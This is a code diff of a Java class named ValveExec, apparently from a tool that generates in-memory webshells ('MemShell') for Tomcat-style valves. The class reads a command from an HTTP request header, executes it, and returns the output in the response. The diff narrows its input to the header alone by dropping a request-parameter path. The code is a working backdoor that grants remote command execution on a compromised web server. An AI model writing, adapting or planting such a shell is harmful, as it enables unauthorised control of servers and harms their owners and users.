@@ -16,11 +16,10 @@ import java.lang.reflect.Method;
  */
 @MemShell(MemShell.Valve)
 @MemShellFunction(MemShellFunction.Exec)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class ValveExec implements InvocationHandler {
 
     private static String HEADER;
-    private static String PARAM;
     private Object targetObject;
     private Object next;
 
@@ -57,14 +56,7 @@ public class ValveExec implements InvocationHandler {
             }
 
             Object header = invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-            Object param = invokeMethod(servletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
-            String str = null;
-            if (header != null) {
-                str = (String) header;
-            } else if (param != null) {
-                str = (String) param;
-            }
-            String result = exec(str);
+            String result = exec((String) header);
             invokeMethod(servletResponse, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
             Object writer = invokeMethod(servletResponse, "getWriter", new Class[]{}, new Object[]{});
             invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
